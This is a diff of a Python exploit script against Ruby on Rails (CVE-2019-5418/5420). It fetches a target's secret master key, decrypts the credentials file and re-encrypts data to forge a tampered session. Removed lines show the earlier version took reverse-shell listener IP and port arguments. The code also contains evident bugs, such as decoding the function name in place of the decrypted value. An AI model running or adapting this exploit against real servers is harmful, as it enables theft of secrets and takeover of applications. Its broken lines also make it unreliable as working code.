@@ -1,25 +1,22 @@
 import argparse
+import hashlib
 import requests
 import base64
+from Crypto.Cipher import AES
 import sys
 from log_colors import *
-from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives.ciphers import (
-    Cipher, algorithms, modes
-)
 
 requests.packages.urllib3.disable_warnings()
 
-# CVE-2019-5420
-# Rails <5.2.2.1, <6.0.0.beta3 RCE.
-class CVE2019_5420:
+# CVE-2019-5420 + CVE-2019-5418
+# Rails <5.2.2.1, <6.0.0.beta3.
+class CVE2019_5418:
     headers = {"User-Agent" : "Mozilla/5.0"}
 
-    def __init__(self, url, path, lhost, lport):
+    def __init__(self, url, path):
         print (LogColors.BLUE + "victim: " + url  + "..." + LogColors.ENDC)
         self.url = url.rstrip("/")
         self.path = path.strip("/")
-        self.lhost, self.lport = lhost, lport
         self.session = requests.Session()
 
     # check is vulnerable 
@@ -84,33 +81,24 @@ class CVE2019_5420:
     # GCM tag used for authenticating the message.
     def decrypt(self, key, ciphertext, iv, tag):
         print (LogColors.BLUE + "decrypt..." + LogColors.ENDC)
-        decryptor = Cipher(
-            algorithms.AES(key),
-            modes.GCM(iv, tag),
-            backend=default_backend()
-        ).decryptor()
+        cipher = AES.new(key, AES.MODE_GCM, nonce = iv)
         try:
-            decrypted = decryptor.update(ciphertext) + decryptor.finalize()
+            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            print (LogColors.YELLOW + decrypt.decode() + LogColors.ENDC)
             print (LogColors.GREEN + "successfully decrypt :)" + LogColors)
             return decrypted
-        except Exception:
+        except Exception as e:
             print (LogColors.RED + "failed to decrypt :(" + LogColors.ENDC)
             sys.exit()
     
     # encrypt - for re encrypt with tampered session
     def encrypt(self, key, plaintext, iv):
         print (LogColors.BLUE + "encrypt..." + LogColors.ENDC)
-        #iv = os.random(12)
-        encryptor = Cipher(
-            algorithms.AES(key),
-            modes.GCM(iv),
-            backend=default_backend()
-        ).encryptor()
-
+        cipher = AES.new(key, AES.MODE_GCM, nonce = iv)
         try:
-            ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+            ciphertext, tag = cipher.encrypt_and_digest(plaintext)
             print (LogColors.GREEN + "successfully encrypt :)" + LogColors.ENDC)
-            return (iv, ciphertext, encryptor.tag)
+            return (ciphertext, iv, tag)
         except Exception:
             print (LogColors.RED + "failed to encrypt :(" + LogColors.ENDC)
             sys.exit()
@@ -122,18 +110,16 @@ class CVE2019_5420:
         self.get_master_key()
         ciphertext, iv, tag = self.decode_cred()
         master = self.decode_master()
-        print (self.decrypt(master, ciphertext, iv, tag))
+        decrypted = self.decrypt(master, ciphertext, iv, tag)
+        ciphertext2, iv2, tag2 = self.encrypt(master, decrypted, iv)
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
     parser.add_argument('-u','--url', required = True, help = "target url")
     parser.add_argument('-P','--path', required = True, help = "target path")
-    parser.add_argument('-i','--ip', required = True, help = "revshell listener ip")
-    parser.add_argument('-p','--port', required = True, help = "revshell listener port")
     args = vars(parser.parse_args())
     url = args['url']
     path = args['path']
-    ip, port = args['ip'], args['port']
-    cve = CVE2019_5420(url, path, ip, port)
+    cve = CVE2019_5418(url, path)
     cve.exploit()
 
